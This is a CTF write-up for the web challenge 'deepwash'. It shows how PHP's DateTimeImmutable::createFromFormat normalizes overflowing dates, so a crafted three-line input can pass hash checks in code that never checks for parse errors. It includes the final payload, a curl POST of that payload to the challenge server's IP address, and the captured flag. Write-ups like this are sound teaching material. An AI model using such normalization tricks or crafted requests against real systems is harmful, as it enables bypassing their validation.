---
layout: post
title: "deepwash — PHP DateTimeImmutable parser logic (CITEFLAG Quals 2026)"
date: 2026-03-15 13:00:00 +0100
categories: [CTF, Web]
tags: [web, php, parser-logic, ctf, datetime]
description: "Web CTF writeup for deepwash, exploiting PHP DateTimeImmutable normalization behavior to satisfy strict hash constraints with a three-line payload."
---

## Objective

The challenge required sending a POST parameter `x` composed of exactly three lines. The input had to pass validation, be parsed by `DateTimeImmutable::createFromFormat`, and satisfy three hash checks:

| Check | Target |
| --- | --- |
| `md5(json_encode($y))` | `779d88604518d4528cec1539c8ce5fa0` |
| `md5(json_encode($z))` | `156e4ca092477c6c57a3cf114acf08fd` |
| `sha256(json_encode(lines))` | `dca58f177da7427d37b7030b14d77995ccf105051c14f6e5e1ca071e5cc19c93` |

If all conditions passed, the server returned the flag.

## Source analysis

The three lines were parsed with different date formats:

```php
$p = a('!D d M Y', $l[0]);
$q = a('!Y?z', $l[1]);
$r = a('!U H', $l[2]);
```

Then two arrays were constructed:

```php
$y = [
    $p->format('Y-m-d'),
    $q->format('Y-m-d'),
    $r->format('U'),
];

$z = [
    $p->format('D'),
    $q->format('z'),
    $r->format('H:i:s'),
];
```

The important mistake was that parsing errors were not checked after calling:

```php
DateTimeImmutable::createFromFormat(...)
```

## Key behavior

The challenge relied on PHP date parsing normalization. `DateTimeImmutable::createFromFormat` can accept invalid-looking values and normalize overflows instead of rejecting them.

Examples:

```text
2021 366 -> 2022-01-02
1609459200 24 -> next day 00:00:00
Fri 00 Jan 2021 -> 2021-01-01
```

That means the exploit was not hash cracking. The task was to create lines that parse into the needed normalized values.

## Target constraint

From the hash of `$z`, the needed output was:

```json
["Fri", "1", "00:00:00"]
```

So the parsed data had to produce:

| Field | Needed value |
| --- | --- |
| Day name | `Fri` |
| Day of year | `1` |
| Time | `00:00:00` |

## Payload construction

### Line 3: `!U H`

```text
3600 00
```

`3600` represents `01:00:00`, and the `H=00` component forces the hour through normalization to produce:

```text
00:00:00
```

### Line 2: `!Y?z`

```text
2022x366
```

The `z=366` value overflows into the next year and becomes:

```text
2023-01-02
```

The formatted day-of-year is:

```text
1
```

### Line 1: `!D d M Y`

```text
Fri 19 November 2011
```

PHP adjusts the date into a valid Friday and the resulting formatted day name satisfies:

```text
Fri
```

## Final payload

```text
Fri 19 November 2011
2022x366
3600 00
```

## Exploit request

```bash
curl -s -X POST "http://34.175.114.248/" \
  --data-urlencode $'x=Fri 19 November 2011\n2022x366\n3600 00'
```

## Flag

```text
CITEFLAG{b37a508f1b6a4a49a9f2420f8fc23f61}
```

## Lessons learned

This challenge was about parser behavior, not brute force. The useful technique was to understand how PHP normalizes invalid dates and then construct an input that produces the expected formatted values. Whenever `DateTime::createFromFormat` is used in CTF code without checking `DateTime::getLastErrors()`, overflow and normalization behavior should be tested.
